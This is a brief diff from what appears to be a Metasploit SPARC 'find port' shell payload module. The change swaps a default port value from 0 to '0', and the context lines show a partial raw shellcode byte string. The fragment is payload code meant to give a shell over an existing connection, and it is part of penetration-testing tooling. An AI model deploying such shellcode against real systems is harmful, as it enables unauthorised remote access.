@@ -25,7 +25,7 @@ module ShellFindPort
 	end
 
 	def generate
-		port    = (datastore['CPORT'] || 0).to_i
+		port    = (datastore['CPORT'] || '0').to_i
 		payload = 
 			Rex::Arch::Sparc.set(port, "l0") +
 			"\x9c\x2b\xa0\x07\x90\x1a\x80\x0a\xd0\x23\xbf\xe8\x90\x02\x20\x01" +
